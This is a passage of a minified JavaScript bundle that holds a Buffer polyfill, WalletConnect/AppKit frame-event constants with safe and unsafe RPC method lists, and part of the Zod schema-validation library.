access memory outside buffer bounds"},RangeError),U("ERR_INVALID_ARG_TYPE",function(Q,z){return`The "${Q}" argument must be of type number. Received type ${typeof z}`},TypeError),U("ERR_OUT_OF_RANGE",function(Q,z,H){let ie=`The value of "${Q}" is out of range.`,pe=H;return Number.isInteger(H)&&Math.abs(H)>2**32?pe=G(String(H)):typeof H=="bigint"&&(pe=String(H),(H>BigInt(2)**BigInt(32)||H<-(BigInt(2)**BigInt(32)))&&(pe=G(pe)),pe+="n"),ie+=` It must be ${z}. Received ${pe}`,ie},RangeError);function G(Q){let z="",H=Q.length;const ie=Q[0]==="-"?1:0;for(;H>=ie+4;H-=3)z=`_${Q.slice(H-3,H)}${z}`;return`${Q.slice(0,H)}${z}`}function Z(Q,z,H){Y(z,"offset"),(Q[z]===void 0||Q[z+H]===void 0)&&se(z,Q.length-(H+1))}function j(Q,z,H,ie,pe,we){if(Q>H||Q<z){const _e=typeof z=="bigint"?"n":"";let et;throw z===0||z===BigInt(0)?et=`>= 0${_e} and < 2${_e} ** ${(we+1)*8}${_e}`:et=`>= -(2${_e} ** ${(we+1)*8-1}${_e}) and < 2 ** ${(we+1)*8-1}${_e}`,new ae.ERR_OUT_OF_RANGE("value",et,Q)}Z(ie,pe,we)}function Y(Q,z){if(typeof Q!="number")throw new ae.ERR_INVALID_ARG_TYPE(z,"number",Q)}function se(Q,z,H){throw Math.floor(Q)!==Q?(Y(Q,H),new ae.ERR_OUT_OF_RANGE("offset","an integer",Q)):z<0?new ae.ERR_BUFFER_OUT_OF_BOUNDS:new ae.ERR_OUT_OF_RANGE("offset",`>= 0 and <= ${z}`,Q)}const ne=/[^+/0-9A-Za-z-_]/g;function Te(Q){if(Q=Q.split("=")[0],Q=Q.trim().replace(ne,""),Q.length<2)return"";for(;Q.length%4!==0;)Q=Q+"=";return Q}function Re(Q,z){z=z||1/0;let H;const ie=Q.length;let pe=null;const we=[];for(let _e=0;_e<ie;++_e){if(H=Q.charCodeAt(_e),H>55295&&H<57344){if(!pe){if(H>56319){(z-=3)>-1&&we.push(239,191,189);continue}else if(_e+1===ie){(z-=3)>-1&&we.push(239,191,189);continue}pe=H;continue}if(H<56320){(z-=3)>-1&&we.push(239,191,189),pe=H;continue}H=(pe-55296<<10|H-56320)+65536}else pe&&(z-=3)>-1&&we.push(239,191,189);if(pe=null,H<128){if((z-=1)<0)break;we.push(H)}else if(H<2048){if((z-=2)<0)break;we.push(H>>6|192,H&63|128)}else if(H<65536){if((z-=3)<0)break;we.push(H>>12|224,H>>6&63|128,H&63|128)}else if(H<1114112){if((z-=4)<0)break;we.push(H>>18|240,H>>12&63|128,H>>6&63|128,H&63|128)}else throw new Error("Invalid code point")}return we}function $e(Q){const z=[];for(let H=0;H<Q.length;++H)z.push(Q.charCodeAt(H)&255);return z}function Ae(Q,z){let H,ie,pe;const we=[];for(let _e=0;_e<Q.length&&!((z-=2)<0);++_e)H=Q.charCodeAt(_e),ie=H>>8,pe=H%256,we.push(pe),we.push(ie);return we}function De(Q){return e.toByteArray(Te(Q))}function Le(Q,z,H,ie){let pe;for(pe=0;pe<ie&&!(pe+H>=z.length||pe>=Q.length);++pe)z[pe+H]=Q[pe];return pe}function it(Q,z){return Q instanceof z||Q!=null&&Q.constructor!=null&&Q.constructor.name!=null&&Q.constructor.name===z.name}function nt(Q){return Q!==Q}const ct=function(){const Q="0123456789abcdef",z=new Array(256);for(let H=0;H<16;++H){const ie=H*16;for(let pe=0;pe<16;++pe)z[ie+pe]=Q[H]+Q[pe]}return z}();function St(Q){return typeof BigInt>"u"?zt:Q}function zt(){throw new Error("BigInt not supported")}}(tS)),tS}var P1e=N1e();typeof window<"u"&&(window.Buffer||(window.Buffer=P1e.Buffer),window.global||(window.global=window),window.process||(window.process={}),window.process?.env||(window.process={env:{}}));var K$={};const $1e=K$.NEXT_PUBLIC_SECURE_SITE_SDK_URL||"https://secure.walletconnect.org/sdk",R1e=K$.NEXT_PUBLIC_DEFAULT_LOG_LEVEL||"error",O1e=K$.NEXT_PUBLIC_SECURE_SITE_SDK_VERSION||3,Dt={APP_EVENT_KEY:"@w3m-app/",FRAME_EVENT_KEY:"@w3m-frame/",RPC_METHOD_KEY:"RPC_",STORAGE_KEY:"@appkit-wallet/",SESSION_TOKEN_KEY:"SESSION_TOKEN_KEY",EMAIL_LOGIN_USED_KEY:"EMAIL_LOGIN_USED_KEY",LAST_USED_CHAIN_KEY:"LAST_USED_CHAIN_KEY",LAST_EMAIL_LOGIN_TIME:"LAST_EMAIL_LOGIN_TIME",EMAIL:"EMAIL",PREFERRED_ACCOUNT_TYPE:"PREFERRED_ACCOUNT_TYPE",SMART_ACCOUNT_ENABLED:"SMART_ACCOUNT_ENABLED",SMART_ACCOUNT_ENABLED_NETWORKS:"SMART_ACCOUNT_ENABLED_NETWORKS",SOCIAL_USERNAME:"SOCIAL_USERNAME",APP_SWITCH_NETWORK:"@w3m-app/SWITCH_NETWORK",APP_CONNECT_EMAIL:"@w3m-app/CONNECT_EMAIL",APP_CONNECT_DEVICE:"@w3m-app/CONNECT_DEVICE",APP_CONNECT_OTP:"@w3m-app/CONNECT_OTP",APP_CONNECT_SOCIAL:"@w3m-app/CONNECT_SOCIAL",APP_GET_SOCIAL_REDIRECT_URI:"@w3m-app/GET_SOCIAL_REDIRECT_URI",APP_GET_USER:"@w3m-app/GET_USER",APP_SIGN_OUT:"@w3m-app/SIGN_OUT",APP_IS_CONNECTED:"@w3m-app/IS_CONNECTED",APP_GET_CHAIN_ID:"@w3m-app/GET_CHAIN_ID",APP_RPC_REQUEST:"@w3m-app/RPC_REQUEST",APP_UPDATE_EMAIL:"@w3m-app/UPDATE_EMAIL",APP_UPDATE_EMAIL_PRIMARY_OTP:"@w3m-app/UPDATE_EMAIL_PRIMARY_OTP",APP_UPDATE_EMAIL_SECONDARY_OTP:"@w3m-app/UPDATE_EMAIL_SECONDARY_OTP",APP_AWAIT_UPDATE_EMAIL:"@w3m-app/AWAIT_UPDATE_EMAIL",APP_SYNC_THEME:"@w3m-app/SYNC_THEME",APP_SYNC_DAPP_DATA:"@w3m-app/SYNC_DAPP_DATA",APP_GET_SMART_ACCOUNT_ENABLED_NETWORKS:"@w3m-app/GET_SMART_ACCOUNT_ENABLED_NETWORKS",APP_INIT_SMART_ACCOUNT:"@w3m-app/INIT_SMART_ACCOUNT",APP_SET_PREFERRED_ACCOUNT:"@w3m-app/SET_PREFERRED_ACCOUNT",APP_CONNECT_FARCASTER:"@w3m-app/CONNECT_FARCASTER",APP_GET_FARCASTER_URI:"@w3m-app/GET_FARCASTER_URI",APP_RELOAD:"@w3m-app/RELOAD",FRAME_SWITCH_NETWORK_ERROR:"@w3m-frame/SWITCH_NETWORK_ERROR",FRAME_SWITCH_NETWORK_SUCCESS:"@w3m-frame/SWITCH_NETWORK_SUCCESS",FRAME_CONNECT_EMAIL_ERROR:"@w3m-frame/CONNECT_EMAIL_ERROR",FRAME_CONNECT_EMAIL_SUCCESS:"@w3m-frame/CONNECT_EMAIL_SUCCESS",FRAME_CONNECT_DEVICE_ERROR:"@w3m-frame/CONNECT_DEVICE_ERROR",FRAME_CONNECT_DEVICE_SUCCESS:"@w3m-frame/CONNECT_DEVICE_SUCCESS",FRAME_CONNECT_OTP_SUCCESS:"@w3m-frame/CONNECT_OTP_SUCCESS",FRAME_CONNECT_OTP_ERROR:"@w3m-frame/CONNECT_OTP_ERROR",FRAME_CONNECT_SOCIAL_SUCCESS:"@w3m-frame/CONNECT_SOCIAL_SUCCESS",FRAME_CONNECT_SOCIAL_ERROR:"@w3m-frame/CONNECT_SOCIAL_ERROR",FRAME_CONNECT_FARCASTER_SUCCESS:"@w3m-frame/CONNECT_FARCASTER_SUCCESS",FRAME_CONNECT_FARCASTER_ERROR:"@w3m-frame/CONNECT_FARCASTER_ERROR",FRAME_GET_FARCASTER_URI_SUCCESS:"@w3m-frame/GET_FARCASTER_URI_SUCCESS",FRAME_GET_FARCASTER_URI_ERROR:"@w3m-frame/GET_FARCASTER_URI_ERROR",FRAME_GET_SOCIAL_REDIRECT_URI_SUCCESS:"@w3m-frame/GET_SOCIAL_REDIRECT_URI_SUCCESS",FRAME_GET_SOCIAL_REDIRECT_URI_ERROR:"@w3m-frame/GET_SOCIAL_REDIRECT_URI_ERROR",FRAME_GET_USER_SUCCESS:"@w3m-frame/GET_USER_SUCCESS",FRAME_GET_USER_ERROR:"@w3m-frame/GET_USER_ERROR",FRAME_SIGN_OUT_SUCCESS:"@w3m-frame/SIGN_OUT_SUCCESS",FRAME_SIGN_OUT_ERROR:"@w3m-frame/SIGN_OUT_ERROR",FRAME_IS_CONNECTED_SUCCESS:"@w3m-frame/IS_CONNECTED_SUCCESS",FRAME_IS_CONNECTED_ERROR:"@w3m-frame/IS_CONNECTED_ERROR",FRAME_GET_CHAIN_ID_SUCCESS:"@w3m-frame/GET_CHAIN_ID_SUCCESS",FRAME_GET_CHAIN_ID_ERROR:"@w3m-frame/GET_CHAIN_ID_ERROR",FRAME_RPC_REQUEST_SUCCESS:"@w3m-frame/RPC_REQUEST_SUCCESS",FRAME_RPC_REQUEST_ERROR:"@w3m-frame/RPC_REQUEST_ERROR",FRAME_SESSION_UPDATE:"@w3m-frame/SESSION_UPDATE",FRAME_UPDATE_EMAIL_SUCCESS:"@w3m-frame/UPDATE_EMAIL_SUCCESS",FRAME_UPDATE_EMAIL_ERROR:"@w3m-frame/UPDATE_EMAIL_ERROR",FRAME_UPDATE_EMAIL_PRIMARY_OTP_SUCCESS:"@w3m-frame/UPDATE_EMAIL_PRIMARY_OTP_SUCCESS",FRAME_UPDATE_EMAIL_PRIMARY_OTP_ERROR:"@w3m-frame/UPDATE_EMAIL_PRIMARY_OTP_ERROR",FRAME_UPDATE_EMAIL_SECONDARY_OTP_SUCCESS:"@w3m-frame/UPDATE_EMAIL_SECONDARY_OTP_SUCCESS",FRAME_UPDATE_EMAIL_SECONDARY_OTP_ERROR:"@w3m-frame/UPDATE_EMAIL_SECONDARY_OTP_ERROR",FRAME_SYNC_THEME_SUCCESS:"@w3m-frame/SYNC_THEME_SUCCESS",FRAME_SYNC_THEME_ERROR:"@w3m-frame/SYNC_THEME_ERROR",FRAME_SYNC_DAPP_DATA_SUCCESS:"@w3m-frame/SYNC_DAPP_DATA_SUCCESS",FRAME_SYNC_DAPP_DATA_ERROR:"@w3m-frame/SYNC_DAPP_DATA_ERROR",FRAME_GET_SMART_ACCOUNT_ENABLED_NETWORKS_SUCCESS:"@w3m-frame/GET_SMART_ACCOUNT_ENABLED_NETWORKS_SUCCESS",FRAME_GET_SMART_ACCOUNT_ENABLED_NETWORKS_ERROR:"@w3m-frame/GET_SMART_ACCOUNT_ENABLED_NETWORKS_ERROR",FRAME_INIT_SMART_ACCOUNT_SUCCESS:"@w3m-frame/INIT_SMART_ACCOUNT_SUCCESS",FRAME_INIT_SMART_ACCOUNT_ERROR:"@w3m-frame/INIT_SMART_ACCOUNT_ERROR",FRAME_SET_PREFERRED_ACCOUNT_SUCCESS:"@w3m-frame/SET_PREFERRED_ACCOUNT_SUCCESS",FRAME_SET_PREFERRED_ACCOUNT_ERROR:"@w3m-frame/SET_PREFERRED_ACCOUNT_ERROR",FRAME_READY:"@w3m-frame/READY",FRAME_RELOAD_SUCCESS:"@w3m-frame/RELOAD_SUCCESS",FRAME_RELOAD_ERROR:"@w3m-frame/RELOAD_ERROR",RPC_RESPONSE_TYPE_ERROR:"RPC_RESPONSE_ERROR",RPC_RESPONSE_TYPE_TX:"RPC_RESPONSE_TRANSACTION_HASH",RPC_RESPONSE_TYPE_OBJECT:"RPC_RESPONSE_OBJECT"},vr={SAFE_RPC_METHODS:["eth_accounts","eth_blockNumber","eth_call","eth_chainId","eth_estimateGas","eth_feeHistory","eth_gasPrice","eth_getAccount","eth_getBalance","eth_getBlockByHash","eth_getBlockByNumber","eth_getBlockReceipts","eth_getBlockTransactionCountByHash","eth_getBlockTransactionCountByNumber","eth_getCode","eth_getFilterChanges","eth_getFilterLogs","eth_getLogs","eth_getProof","eth_getStorageAt","eth_getTransactionByBlockHashAndIndex","eth_getTransactionByBlockNumberAndIndex","eth_getTransactionByHash","eth_getTransactionCount","eth_getTransactionReceipt","eth_getUncleCountByBlockHash","eth_getUncleCountByBlockNumber","eth_maxPriorityFeePerGas","eth_newBlockFilter","eth_newFilter","eth_newPendingTransactionFilter","eth_sendRawTransaction","eth_syncing","eth_uninstallFilter","wallet_getCapabilities","wallet_getCallsStatus","eth_getUserOperationReceipt","eth_estimateUserOperationGas","eth_getUserOperationByHash","eth_supportedEntryPoints","wallet_getAssets"],NOT_SAFE_RPC_METHODS:["personal_sign","eth_signTypedData_v4","eth_sendTransaction","solana_signMessage","solana_signTransaction","solana_signAllTransactions","solana_signAndSendTransaction","wallet_sendCalls","wallet_grantPermissions","wallet_revokePermissions","eth_sendUserOperation"],GET_CHAIN_ID:"eth_chainId",RPC_METHOD_NOT_ALLOWED_MESSAGE:"Requested RPC call is not allowed",RPC_METHOD_NOT_ALLOWED_UI_MESSAGE:"Action not allowed",ACCOUNT_TYPES:{EOA:"eoa",SMART_ACCOUNT:"smartAccount"}},vL={transactionHash:/^0x(?:[A-Fa-f0-9]{64})$/u,signedMessage:/^0x(?:[a-fA-F0-9]{62,})$/u},ro={set(r,e){Ro.isClient&&localStorage.setItem(`${Dt.STORAGE_KEY}${r}`,e)},get(r){return Ro.isClient?localStorage.getItem(`${Dt.STORAGE_KEY}${r}`):null},delete(r,e){Ro.isClient&&(e?localStorage.removeItem(r):localStorage.removeItem(`${Dt.STORAGE_KEY}${r}`))}},F6=30*1e3,Ro={checkIfAllowedToTriggerEmail(){const r=ro.get(Dt.LAST_EMAIL_LOGIN_TIME);if(r){const e=Date.now()-Number(r);if(e<F6){const t=Math.ceil((F6-e)/1e3);throw new Error(`Please try again after ${t} seconds`)}}},getTimeToNextEmailLogin(){const r=ro.get(Dt.LAST_EMAIL_LOGIN_TIME);if(r){const e=Date.now()-Number(r);if(e<F6)return Math.ceil((F6-e)/1e3)}return 0},checkIfRequestExists(r){return vr.NOT_SAFE_RPC_METHODS.includes(r.method)||vr.SAFE_RPC_METHODS.includes(r.method)},getResponseType(r){return typeof r=="string"&&(r?.match(vL.transactionHash)||r?.match(vL.signedMessage))?Dt.RPC_RESPONSE_TYPE_TX:Dt.RPC_RESPONSE_TYPE_OBJECT},checkIfRequestIsSafe(r){return vr.SAFE_RPC_METHODS.includes(r.method)},isClient:typeof window<"u"};var bi;(function(r){r.assertEqual=n=>n;function e(n){}r.assertIs=e;function t(n){throw new Error}r.assertNever=t,r.arrayToEnum=n=>{const s={};for(const o of n)s[o]=o;return s},r.getValidEnumValues=n=>{const s=r.objectKeys(n).filter(a=>typeof n[n[a]]!="number"),o={};for(const a of s)o[a]=n[a];return r.objectValues(o)},r.objectValues=n=>r.objectKeys(n).map(function(s){return n[s]}),r.objectKeys=typeof Object.keys=="function"?n=>Object.keys(n):n=>{const s=[];for(const o in n)Object.prototype.hasOwnProperty.call(n,o)&&s.push(o);return s},r.find=(n,s)=>{for(const o of n)if(s(o))return o},r.isInteger=typeof Number.isInteger=="function"?n=>Number.isInteger(n):n=>typeof n=="number"&&isFinite(n)&&Math.floor(n)===n;function i(n,s=" | "){return n.map(o=>typeof o=="string"?`'${o}'`:o).join(s)}r.joinValues=i,r.jsonStringifyReplacer=(n,s)=>typeof s=="bigint"?s.toString():s})(bi||(bi={}));var dk;(function(r){r.mergeShapes=(e,t)=>({...e,...t})})(dk||(dk={}));const _t=bi.arrayToEnum(["string","nan","number","integer","float","boolean","date","bigint","symbol","function","undefined","null","array","object","unknown","promise","void","never","map","set"]),Af=r=>{switch(typeof r){case"undefined":return _t.undefined;case"string":return _t.string;case"number":return isNaN(r)?_t.nan:_t.number;case"boolean":return _t.boolean;case"function":return _t.function;case"bigint":return _t.bigint;case"symbol":return _t.symbol;case"object":return Array.isArray(r)?_t.array:r===null?_t.null:r.then&&typeof r.then=="function"&&r.catch&&typeof r.catch=="function"?_t.promise:typeof Map<"u"&&r instanceof Map?_t.map:typeof Set<"u"&&r instanceof Set?_t.set:typeof Date<"u"&&r instanceof Date?_t.date:_t.object;default:return _t.unknown}},Je=bi.arrayToEnum(["invalid_type","invalid_literal","custom","invalid_union","invalid_union_discriminator","invalid_enum_value","unrecognized_keys","invalid_arguments","invalid_return_type","invalid_date","invalid_string","too_small","too_big","invalid_intersection_types","not_multiple_of","not_finite"]),B1e=r=>JSON.stringify(r,null,2).replace(/"([^"]+)":/g,"$1:");class du extends Error{constructor(e){super(),this.issues=[],this.addIssue=i=>{this.issues=[...this.issues,i]},this.addIssues=(i=[])=>{this.issues=[...this.issues,...i]};const t=new.target.prototype;Object.setPrototypeOf?Object.setPrototypeOf(this,t):this.__proto__=t,this.name="ZodError",this.issues=e}get errors(){return this.issues}format(e){const t=e||function(s){return s.message},i={_errors:[]},n=s=>{for(const o of s.issues)if(o.code==="invalid_union")o.unionErrors.map(n);else if(o.code==="invalid_return_type")n(o.returnTypeError);else if(o.code==="invalid_arguments")n(o.argumentsError);else if(o.path.length===0)i._errors.push(t(o));else{let a=i,c=0;for(;c<o.path.length;){const l=o.path[c];c===o.path.length-1?(a[l]=a[l]||{_errors:[]},a[l]._errors.push(t(o))):a[l]=a[l]||{_errors:[]},a=a[l],c++}}};return n(this),i}toString(){return this.message}get message(){return JSON.stringify(this.issues,bi.jsonStringifyReplacer,2)}get isEmpty(){return this.issues.length===0}flatten(e=t=>t.message){const t={},i=[];for(const n of this.issues)n.path.length>0?(t[n.path[0]]=t[n.path[0]]||[],t[n.path[0]].push(e(n))):i.push(e(n));return{formErrors:i,fieldErrors:t}}get formErrors(){return this.flatten()}}du.create=r=>new du(r);const Pv=(r,e)=>{let t;switch(r.code){case Je.invalid_type:r.received===_t.undefined?t="Required":t=`Expected ${r.expected}, received ${r.received}`;break;case Je.invalid_literal:t=`Invalid literal value, expected ${JSON.stringify(r.expected,bi.jsonStringifyReplacer)}`;break;case Je.unrecognized_keys:t=`Unrecognized key(s) in object: ${bi.joinValues(r.keys,", ")}`;break;case Je.invalid_union:t="Invalid input";break;case Je.invalid_union_discriminator:t=`Invalid discriminator value. Expected ${bi.joinValues(r.options)}`;break;case Je.invalid_enum_value:t=`Invalid enum value. Expected ${bi.joinValues(r.options)}, received '${r.received}'`;break;case Je.invalid_arguments:t="Invalid function arguments";break;case Je.invalid_return_type:t="Invalid function return type";break;case Je.invalid_date:t="Invalid date";break;case Je.invalid_string:typeof r.validation=="object"?"includes"in r.validation?(t=`Invalid input: must include "${r.validation.includes}"`,typeof r.validation.position=="number"&&(t=`${t} at one or more positions greater than or equal to ${r.validation.position}`)):"startsWith"in r.validation?t=`Invalid input: must start with "${r.validation.startsWith}"`:"endsWith"in r.validation?t=`Invalid input: must end with "${r.validation.endsWith}"`:bi.assertNever(r.validation):r.validation!=="regex"?t=`Invalid ${r.validation}`:t="Invalid";break;case Je.too_small:r.type==="array"?t=`Array must contain ${r.exact?"exactly":r.inclusive?"at least":"more than"} ${r.minimum} element(s)`:r.type==="string"?t=`String must contain ${r.exact?"exactly":r.inclusive?"at least":"over"} ${r.minimum} character(s)`:r.type==="number"?t=`Number must be ${r.exact?"exactly equal to ":r.inclusive?"greater than or equal to ":"greater than "}${r.minimum}`:r.type==="date"?t=`Date must be ${r.exact?"exactly equal to ":r.inclusive?"greater than or equal to ":"greater than "}${new Date(Number(r.minimum))}`:t="Invalid input";break;case Je.too_big:r.type==="array"?t=`Array must contain ${r.exact?"exactly":r.inclusive?"at most":"less than"} ${r.maximum} element(s)`:r.type==="string"?t=`String must contain ${r.exact?"exactly":r.inclusive?"at most":"under"} ${r.maximum} character(s)`:r.type==="number"?t=`Number must be ${r.exact?"exactly":r.inclusive?"less than or equal to":"less than"} ${r.maximum}`:r.type==="bigint"?t=`BigInt must be ${r.exact?"exactly":r.inclusive?"less than or equal to":"less than"} ${r.maximum}`:r.type==="date"?t=`Date must be ${r.exact?"exactly":r.inclusive?"smaller than or equal to":"smaller than"} ${new Date(Number(r.maximum))}`:t="Invalid input";break;case Je.custom:t="Invalid input";break;case Je.invalid_intersection_types:t="Intersection results could not be merged";break;case Je.not_multiple_of:t=`Number must be a multiple of ${r.multipleOf}`;break;case Je.not_finite:t="Number must be finite";break;default:t=e.defaultError,bi.assertNever(r)}return{message:t}};let NJ=Pv;function M1e(r){NJ=r}function K9(){return NJ}const G9=r=>{const{data:e,path:t,errorMaps:i,issueData:n}=r,s=[...t,...n.path||[]],o={...n,path:s};let a="";const c=i.filter(l=>!!l).slice().reverse();for(const l of c)a=l(o,{data:e,defaultError:a}).message;return{...n,path:s,message:n.message||a}},D1e=[];function Pt(r,e){const t=G9({issueData:e,data:r.data,path:r.path,errorMaps:[r.common.contextualErrorMap,r.schemaErrorMap,K9(),Pv].filter(i=>!!i)});r.common.issues.push(t)}class Do{constructor(){this.value="valid"}dirty(){this.value==="valid"&&(this.value="dirty")}abort(){this.value!=="aborted"&&(this.value="aborted")}static mergeArray(e,t){const i=[];for(const n of t){if(n.status==="aborted")return xr;n.status==="dirty"&&e.dirty(),i.push(n.value)}return{status:e.value,value:i}}static async mergeObjectAsync(e,t){const i=[];for(const n of t)i.push({key:await n.key,value:await n.value});return Do.mergeObjectSync(e,i)}static mergeObjectSync(e,t){const i={};for(const n of t){const{key:s,value:o}=n;if(s.status==="aborted"||o.status==="aborted")return xr;s.status==="dirty"&&e.dirty(),o.status==="dirty"&&e.dirty(),s.value!=="__proto__"&&(typeof o.value<"u"||n.alwaysSet)&&(i[s.value]=o.value)}return{status:e.value,value:i}}}const xr=Object.freeze({status:"aborted"}),PJ=r=>({status:"dirty",value:r}),Jo=r=>({status:"valid",value:r}),hk=r=>r.status==="aborted",fk=r=>r.status==="dirty",$v=r=>r.status==="valid",Z9=r=>typeof Promise<"u"&&r instanceof Promise;var Jt;(function(r){r.errToObj=e=>typeof e=="string"?{message:e}:e||{},r.toString=e=>typeof e=="string"?e:e?.message})(Jt||(Jt={}));class Nd{constructor(e,t,i,n){this._cachedPath=[],this.parent=e,this.data=t,this._path=i,this._key=n}get path(){return this._cachedPath.length||(this._key instanceof Array?this._cachedPath.push(...this._path,...this._key):this._cachedPath.push(...this._path,this._key)),this._cachedPath}}const yL=(r,e)=>{if($v(e))return{success:!0,data:e.value};if(!r.common.issues.length)throw new Error("Validation failed but no issues detected.");return{success:!1,get error(){if(this._error)return this._error;const t=new du(r.common.issues);return this._error=t,this._error}}};function Sr(r){if(!r)return{};const{errorMap:e,invalid_type_error:t,required_error:i,description:n}=r;if(e&&(t||i))throw new Error(`Can't use "invalid_type_error" or "required_error" in conjunction with custom error map.`);return e?{errorMap:e,description:n}:{errorMap:(o,a)=>o.code!=="invalid_type"?{message:a.defaultError}:typeof a.data>"u"?{message:i??a.defaultError}:{message:t??a.defaultError},description:n}}class Rr{constructor(e){this.spa=this.safeParseAsync,this._def=e,this.parse=this.parse.bind(this),this.safeParse=this.safeParse.bind(this),this.parseAsync=this.parseAsync.bind(this),this.safeParseAsync=this.safeParseAsync.bind(this),this.spa=this.spa.bind(this),this.refine=this.refine.bind(this),this.refinement=this.refinement.bind(this),this.superRefine=this.superRefine.bind(this),this.optional=this.optional.bind(this),this.nullable=this.nullable.bind(this),this.nullish=this.nullish.bind(this),this.array=this.array.bind(this),this.promise=this.promise.bind(this),this.or=this.or.bind(this),this.and=this.and.bind(this),this.transform=this.transform.bind(this),this.brand=this.brand.bind(this),this.default=this.default.bind(this),this.catch=this.catch.bind(this),this.describe=this.describe.bind(this),this.pipe=this.pipe.bind(this),this.readonly=this.readonly.bind(this),this.isNullable=this.isNullable.bind(this),this.isOptional=this.isOptional.bind(this)}get description(){return this._def.description}_getType(e){return Af(e.data)}_getOrReturnCtx(e,t){return t||{common:e.parent.common,data:e.data,parsedType:Af(e.data),schemaErrorMap:this._def.errorMap,path:e.path,parent:e.parent}}_processInputParams(e){return{status:new Do,ctx:{common:e.parent.common,data:e.data,parsedType:Af(e.data),schemaErrorMap:this._def.errorMap,path:e.path,parent:e.parent}}}_parseSync(e){const t=this._parse(e);if(Z9(t))throw new Error("Synchronous parse encountered promise.");return t}_parseAsync(e){const t=this._parse(e);return Promise.resolve(t)}parse(e,t){const i=this.safeParse(e,t);if(i.success)return i.data;throw i.error}safeParse(e,t){var i;const n={common:{issues:[],async:(i=t?.async)!==null&&i!==void 0?i:!1,contextualErrorMap:t?.errorMap},path:t?.path||[],schemaErrorMap:this._def.errorMap,parent:null,data:e,parsedType:Af(e)},s=this._parseSync({data:e,path:n.path,parent:n});return yL(n,s)}async parseAsync(e,t){const i=await this.safeParseAsync(e,t);if(i.success)return i.data;throw i.error}async safeParseAsync(e,t){const i={common:{issues:[],contextualErrorMap:t?.errorMap,async:!0},path:t?.path||[],schemaErrorMap:this._def.errorMap,parent:null,data:e,parsedType:Af(e)},n=this._parse({data:e,path:i.path,parent:i}),s=await(Z9(n)?n:Promise.resolve(n));return yL(i,s)}refine(e,t){const i=n=>typeof t=="string"||typeof t>"u"?{message:t}:typeof t=="function"?t(n):t;return this._refinement((n,s)=>{const o=e(n),a=()=>s.addIssue({code:Je.custom,...i(n)});return typeof Promise<"u"&&o instanceof Promise?o.then(c=>c?!0:(a(),!1)):o?!0:(a(),!1)})}refinement(e,t){return this._refinement((i,n)=>e(i)?!0:(n.addIssue(typeof t=="function"?t(i,n):t),!1))}_refinement(e){return new pu({schema:this,typeName:hr.ZodEffects,effect:{type:"refinement",refinement:e}})}superRefine(e){return this._refinement(e)}optional(){return Xh.create(this,this._def)}nullable(){return Y1.create(this,this._def)}nullish(){return this.nullable().optional()}array(){return hu.create(this,this._def)}promise(){return Aw.create(this,this._def)}or(e){return Mv.create([this,e],this._def)}and(e){return Dv.create(this,e,this._def)}transform(e){return new pu({...Sr(this._def),schema:this,typeName:hr.ZodEffects,effect:{type:"transform",transform:e}})}default(e){const t=typeof e=="function"?e:()=>e;return new qv({...Sr(this._def),innerType:this,defaultValue:t,typeName:hr.ZodDefault})}brand(){return new RJ({typeName:hr.ZodBranded,type:this,...Sr(this._def)})}catch(e){const t=typeof e=="function"?e:()=>e;return new X9({...Sr(this._def),innerType:this,catchValue:t,typeName:hr.ZodCatch})}describe(e){const t=this.constructor;return new t({...this._def,description:e})}pipe(e){return s4.create(this,e)}readonly(){return t7.create(this)}isOptional(){return this.safeParse(void 0).success}isNullable(){return this.safeParse(null).success}}const L1e=/^c[^\s-]{8,}$/i,U1e=/^[a-z][a-z0-9]*$/,j1e=/^[0-9A-HJKMNP-TV-Z]{26}$/,F1e=/^[0-9a-fA-F]{8}\b-[0-9a-fA-F]{4}\b-[0-9a-fA-F]{4}\b-[0-9a-fA-F]{4}\b-[0-9a-fA-F]{12}$/i,q1e=/^(?!\.)(?!.*\.\.)([A-Z0-9_+-\.]*)[A-Z0-9_+-]@([A-Z0-9][A-Z0-9\-]*\.)+[A-Z]{2,}$/i,z1e="^(\\p{Extended_Pictographic}|\\p{Emoji_Component})+$";let rS;const W1e=/^(((25[0-5])|(2[0-4][0-9])|(1[0-9]{2})|([0-9]{1,2}))\.){3}((25[0-5])|(2[0-4][0-9])|(1[0-9]{2})|([0-9]{1,2}))$/,H1e=/^(([a-f0-9]{1,4}:){7}|::([a-f0-9]{1,4}:){0,6}|([a-f0-9]{1,4}:){1}:([a-f0-9]{1,4}:){0,5}|([a-f0-9]{1,4}:){2}:([a-f0-9]{1,4}:){0,4}|([a-f0-9]{1,4}:){3}:([a-f0-9]{1,4}:){0,3}|([a-f0-9]{1,4}:){4}:([a-f0-9]{1,4}:){0,2}|([a-f0-9]{1,4}:){5}:([a-f0-9]{1,4}:){0,1})([a-f0-9]{1,4}|(((25[0-5])|(2[0-4][0-9])|(1[0-9]{2})|([0-9]{1,2}))\.){3}((25[0-5])|(2[0-4][0-9])|(1[0-9]{2})|([0-9]{1,2})))$/,V1e=r=>r.precision?r.offset?new RegExp(`^\\d{4}-\\d{2}-\\d{2}T\\d{2}:\\d{2}:\\d{2}\\.\\d{${r.precision}}(([+-]\\d{2}(:?\\d{2})?)|Z)$`):new RegExp(`^\\d{4}-\\d{2}-\\d{2}T\\d{2}:\\d{2}:\\d{2}\\.\\d{${r.precision}}Z$`):r.precision===0?r.offset?new RegExp("^\\d{4}-\\d{2}-\\d{2}T\\d{2}:\\d{2}:\\d{2}(([+-]\\d{2}(:?\\d{2})?)|Z)$"):new RegExp("^\\d{4}-\\d{2}-\\d{2}T\\d{2}:\\d{2}:\\d{2}Z$"):r.offset?new RegExp("^\\d{4}-\\d{2}-\\d{2}T\\d{2}:\\d{2}:\\d{2}(\\.\\d+)?(([+-]\\d{2}(:?\\d{2})?)|Z)$"):new RegExp("^\\d{4}-\\d{2}-\\d{2}T\\d{2}:\\d{2}:\\d{2}(\\.\\d+)?Z$");function K1e(r,e){return!!((e==="v4"||!e)&&W1e.test(r)||(e==="v6"||!e)&&H1e.test(r))}class cu extends Rr{_parse(e){if(this._def.coerce&&(e.data=String(e.data)),this._getType(e)!==_t.string){const s=this._getOrReturnCtx(e);return Pt(s,{code:Je.invalid_type,expected:_t.string,received:s.parsedType}),xr}const i=new Do;let n;for(const s of this._def.checks)if(s.kind==="min")e.data.length<s.value&&(n=this._getOrReturnCtx(e,n),Pt(n,{code:Je.too_small,minimum:s.value,type:"string",inclusive:!0,exact:!1,message:s.message}),i.dirty());else if(s.kind==="max")e.data.length>s.value&&(n=this._getOrReturnCtx(e,n),Pt(n,{code:Je.too_big,maximum:s.value,type:"string",inclusive:!0,exact:!1,message:s.message}),i.dirty());else if(s.kind==="length"){const 